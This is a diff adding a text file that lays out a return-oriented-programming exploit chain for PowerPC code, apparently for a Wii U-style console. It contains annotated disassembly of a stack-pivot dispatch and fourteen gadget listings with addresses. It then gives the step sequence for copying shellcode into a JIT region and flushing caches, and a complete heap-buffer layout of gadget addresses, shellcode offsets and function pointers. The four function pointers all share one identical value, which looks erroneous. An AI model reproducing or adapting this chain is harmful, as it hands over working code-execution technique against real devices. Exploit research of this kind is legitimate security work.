@@ -1,0 +1,262 @@
+.text:0ECECB04                 lwz       r30, 0(r3)
+.text:0ECECB08                 lwz       r0, 0x4DC(r30) 	# 1. Pivot the stack into the heap
+.text:0ECECB0C                 mtctr     r0
+.text:0ECECB10                 mr        r31, r3
+.text:0ECECB14                 bctrl
+.text:0ECECB18                 lwz       r11, 0x49C(r30)	# 2. Return into the stack (at the epilogue of any function)
+.text:0ECECB1C                 mr        r29, r3
+.text:0ECECB20                 mtctr     r11
+.text:0ECECB24                 li        r4, 1
+.text:0ECECB28                 mr        r3, r31
+.text:0ECECB2C                 bctrl
+.text:0ECECB30                 lwz       r30, 0(r31)
+.text:0ECECB34                 lwz       r0, 0x4CC(r30)		# 3. Call one of our needed functions
+.text:0ECECB38                 add       r28, r29, r3
+.text:0ECECB3C                 mtctr     r0
+.text:0ECECB40                 mr        r3, r31
+.text:0ECECB44                 bctrl
+.text:0ECECB48                 lwz       r0, 0x48C(r30)		# 4. Return into the stack again
+.text:0ECECB4C                 mr        r30, r3
+.text:0ECECB50                 mtctr     r0
+.text:0ECECB54                 mr        r3, r31
+.text:0ECECB58                 li        r4, 1
+.text:0ECECB5C                 bctrl
+
+Gadgets
+----------------------------------------------------------------
+#1:
+.text:0E6CEA90                 lwz       r0, 0x10+arg_4(r1)
+.text:0E6CEA94                 lwz       r30, 0x10+var_8(r1)
+.text:0E6CEA98                 mtlr      r0
+.text:0E6CEA9C                 lwz       r31, 0x10+var_4(r1)
+.text:0E6CEAA0                 addi      r1, r1, 0x10
+.text:0E6CEAA4                 blr
+
+#2:
+.text:0ECECB34                 lwz       r0, 0x4CC(r30)
+.text:0ECECB38                 add       r28, r29, r3
+.text:0ECECB3C                 mtctr     r0
+.text:0ECECB40                 mr        r3, r31
+.text:0ECECB44                 bctrl
+
+#3:
+.text:0E7AD434                 lwz       r0, 0x28+arg_4(r1)
+.text:0E7AD438                 stw       r3, 0x28+var_10+4(r1)
+.text:0E7AD43C                 lfd       f0, 0x28+var_10(r1)
+.text:0E7AD440                 mtlr      r0
+.text:0E7AD444                 lwz       r31, 0x28+var_4(r1)
+.text:0E7AD448                 stfd      f0, 0x28+var_20(r1)
+.text:0E7AD44C                 lwz       r4, 0x28+var_20+4(r1)
+.text:0E7AD450                 lwz       r3, 0x28+var_20(r1)
+.text:0E7AD454                 addi      r1, r1, 0x28
+.text:0E7AD458                 blr
+
+#4:
+.text:0ECBCF8C                 lwz       r5, 0x58+var_28(r1)
+.text:0ECBCF90                 lwz       r0, 0x58+var_24(r1)
+.text:0ECBCF94                 stw       r5, 0x58+var_50(r1)
+.text:0ECBCF98                 lwz       r3, 0x58+var_50(r1)
+.text:0ECBCF9C                 stw       r0, 0x58+var_4C(r1)
+.text:0ECBCFA0                 lwz       r4, 0x58+var_4C(r1)
+.text:0ECBCFA4                 lmw       r27, 0x58+var_14(r1)
+.text:0ECBCFA8                 lwz       r0, 0x58+arg_4(r1)
+.text:0ECBCFAC                 mtlr      r0
+.text:0ECBCFB0                 addi      r1, r1, 0x58
+.text:0ECBCFB4                 blr
+
+#5:
+.text:0E6CEA90                 lwz       r0, 0x10+arg_4(r1)
+.text:0E6CEA94                 lwz       r30, 0x10+var_8(r1)
+.text:0E6CEA98                 mtlr      r0
+.text:0E6CEA9C                 lwz       r31, 0x10+var_4(r1)
+.text:0E6CEAA0                 addi      r1, r1, 0x10
+.text:0E6CEAA4                 blr
+
+#6:
+.text:0ECECB34                 lwz       r0, 0x4CC(r30)
+.text:0ECECB38                 add       r28, r29, r3
+.text:0ECECB3C                 mtctr     r0
+.text:0ECECB40                 mr        r3, r31
+.text:0ECECB44                 bctrl
+
+#7:
+.text:0E6CEA90                 lwz       r0, 0x10+arg_4(r1)
+.text:0E6CEA94                 lwz       r30, 0x10+var_8(r1)
+.text:0E6CEA98                 mtlr      r0
+.text:0E6CEA9C                 lwz       r31, 0x10+var_4(r1)
+.text:0E6CEAA0                 addi      r1, r1, 0x10
+.text:0E6CEAA4                 blr
+
+#8:
+.text:0E7AD434                 lwz       r0, 0x28+arg_4(r1)
+.text:0E7AD438                 stw       r3, 0x28+var_10+4(r1)
+.text:0E7AD43C                 lfd       f0, 0x28+var_10(r1)
+.text:0E7AD440                 mtlr      r0
+.text:0E7AD444                 lwz       r31, 0x28+var_4(r1)
+.text:0E7AD448                 stfd      f0, 0x28+var_20(r1)
+.text:0E7AD44C                 lwz       r4, 0x28+var_20+4(r1)
+.text:0E7AD450                 lwz       r3, 0x28+var_20(r1)
+.text:0E7AD454                 addi      r1, r1, 0x28
+.text:0E7AD458                 blr
+
+#9:
+.text:0ECECB34                 lwz       r0, 0x4CC(r30)
+.text:0ECECB38                 add       r28, r29, r3
+.text:0ECECB3C                 mtctr     r0
+.text:0ECECB40                 mr        r3, r31
+.text:0ECECB44                 bctrl
+
+#10:
+.text:0E6CEA90                 lwz       r0, 0x10+arg_4(r1)
+.text:0E6CEA94                 lwz       r30, 0x10+var_8(r1)
+.text:0E6CEA98                 mtlr      r0
+.text:0E6CEA9C                 lwz       r31, 0x10+var_4(r1)
+.text:0E6CEAA0                 addi      r1, r1, 0x10
+.text:0E6CEAA4                 blr
+
+#11:
+.text:0E7AD434                 lwz       r0, 0x28+arg_4(r1)
+.text:0E7AD438                 stw       r3, 0x28+var_10+4(r1)
+.text:0E7AD43C                 lfd       f0, 0x28+var_10(r1)
+.text:0E7AD440                 mtlr      r0
+.text:0E7AD444                 lwz       r31, 0x28+var_4(r1)
+.text:0E7AD448                 stfd      f0, 0x28+var_20(r1)
+.text:0E7AD44C                 lwz       r4, 0x28+var_20+4(r1)
+.text:0E7AD450                 lwz       r3, 0x28+var_20(r1)
+.text:0E7AD454                 addi      r1, r1, 0x28
+.text:0E7AD458                 blr
+
+#12:
+.text:0ECECB34                 lwz       r0, 0x4CC(r30)
+.text:0ECECB38                 add       r28, r29, r3
+.text:0ECECB3C                 mtctr     r0
+.text:0ECECB40                 mr        r3, r31
+.text:0ECECB44                 bctrl
+
+#13:
+.text:0E6CEA90                 lwz       r0, 0x10+arg_4(r1)
+.text:0E6CEA94                 lwz       r30, 0x10+var_8(r1)
+.text:0E6CEA98                 mtlr      r0
+.text:0E6CEA9C                 lwz       r31, 0x10+var_4(r1)
+.text:0E6CEAA0                 addi      r1, r1, 0x10
+.text:0E6CEAA4                 blr
+
+#14:
+.text:0ECECB34                 lwz       r0, 0x4CC(r30)
+.text:0ECECB38                 add       r28, r29, r3
+.text:0ECECB3C                 mtctr     r0
+.text:0ECECB40                 mr        r3, r31
+.text:0ECECB44                 bctrl
+
+#Stack pivot:
+.text:0E937BD0                 lwz       r4, 0x54(r31)
+.text:0E937BD4                 lwz       r1, 4(r31)
+.text:0E937BD8                 mr        r31, r4
+.text:0E937BDC                 bne       locret_E937BE4
+.text:0E937BE0                 li        r3, 1
+.text:0E937BE4
+.text:0E937BE4 locret_E937BE4:
+.text:0E937BE4                 blr
+
+#Epilogue:
+.text:0E6CE574                 lwz       r0, 8+arg_4(r1)
+.text:0E6CE578                 mtlr      r0
+.text:0E6CE57C                 addi      r1, r1, 8
+.text:0E6CE580                 blr
+
+Stack Execution
+-----------------------------------------------------------------
+1. Load buffer_address into r30 and 0 into r31
+2. Call OSSwitchSecCodeGenMode() indirectly
+3. Load the address of our shellcode into r4, off the stack
+4. Load the length of our shellcode into r5, off the stack
+5. Load (buffer_address + 4) into r30 and the JIT address into r31
+6. Call memcpy() indirectly
+7. Load (buffer_address + 8) into r30 and the JIT address into r31, both off the stack
+8. Load the length of our shellcode into r4, off the stack
+9. Call DCFlushRange() indirectly
+10. Load (buffer_address + 12) into r30 and the JIT address into r31, both off the stack
+11. Load the length of our shellcode into r4, off the stack
+12. Call ICInvalidateRange()
+13. Load buffer_address into r30 and 1 into r31
+14. Call OSSwitchSecCodeGenMode() indirectly
+
+Heap Buffer Layout												Value
+----------------------------------------------------------------------------------------------------------
+0x0C  - ROP gadget #1 (at the start, r1 is at offset 0x08)		0x0E6CEA90
+0x10  - Buffer address
+0x14  - 0
+
+0x1C  - ROP gadget #2 (at the start, r1 is at offset 0x18)		0x0ECECB34
+
+0x24  - ROP gadget #3 (at the start, r1 is at offset 0x20)		0x0E7AD434
+0x28  - 0
+0x2C  - Shellcode address
+
+0x38  - 0
+0x3C  - 0
+0x40  - 0
+0x44  - Shellcode address
+
+0x4C  - ROP gadget #4 (at the start, r1 is at offset 0x48)		0x0ECBCF8C
+0x54  - Shellcode address
+0x78  - Shellcode length                                        0x400
+0x7C  - Shellcode address
+
+0xA4  - ROP gadget #5 (at the start, r1 is at offset 0xA0)		0x0E6CEA90
+0xA8  - Buffer address + 4
+0xAC  - JIT address												0x01800000
+
+0xB4  - ROP gadget #6 (at the start, r1 is at offset 0xB0)		0x0ECECB34
+
+0xBC  - ROP gadget #7 (at the start, r1 is at offset 0xB8)		0x0E6CEA90
+0xC0  - Buffer address + 8
+0xC4  - JIT address												0x01800000
+
+0xCC  - ROP gadget #8 (at the start, r1 is at offset 0xC8)		0x0E7AD434
+0xD0  - 0
+0xD4  - Shellcode length										0x400
+
+0xE0  - 0
+0xE4  - 0
+0xE8  - 0
+0xEC  - Shellcode length										0x400
+
+0xF4  - ROP gadget #9 (at the start, r1 is at offset 0xF0)		0x0ECECB34
+
+0xFC  - ROP gadget #10 (at the start, r1 is at offset 0xF8)		0x0E6CEA90
+0x100 - Buffer address + 12
+0x104 - JIT address												0x01800000
+
+0x10C - ROP gadget #11 (at the start, r1 is at offset 0x108)	0x0E7AD434
+0x110 - 0
+0x114 - Shellcode length										0x400
+
+0x120 - 0
+0x124 - 0
+0x128 - 0
+0x12C - Shellcode length										0x400
+
+0x134 - ROP gadget #12 (at the start, r1 is at offset 0x130)	0x0ECECB34
+
+0x13C - ROP gadget #13 (at the start, r1 is at offset 0x138)	0x0E6CEA90
+0x140 - Buffer address
+0x144 - 1
+
+0x14C - ROP gadget #14 (at the start, r1 is at offset 0x148)	0x0ECECB34
+
+0x154 - ROP gadget #15											0x01800000
+
+0x160 - Shellcode
+
+0x48C - Function epilogue gadget								0x0E6CE574
+0x490 - Function epilogue gadget								0x0E6CE574
+0x494 - Function epilogue gadget								0x0E6CE574
+0x498 - Function epilogue gadget								0x0E6CE574
+0x49C - Function epilogue gadget								0x0E6CE574
+0x4CC - OSSwitchSecCodeGenMode()								0x01032580
+0x4D0 - memcpy()                                                0x01032580
+0x4D4 - DCFlushRange()                                          0x01032580
+0x4D8 - ICInvalidateRange()                                     0x01032580
+0x4DC - Stack pivot gadget										0x0E937BD0
+0x57C - Function epilogue gadget								0x0E6CE574
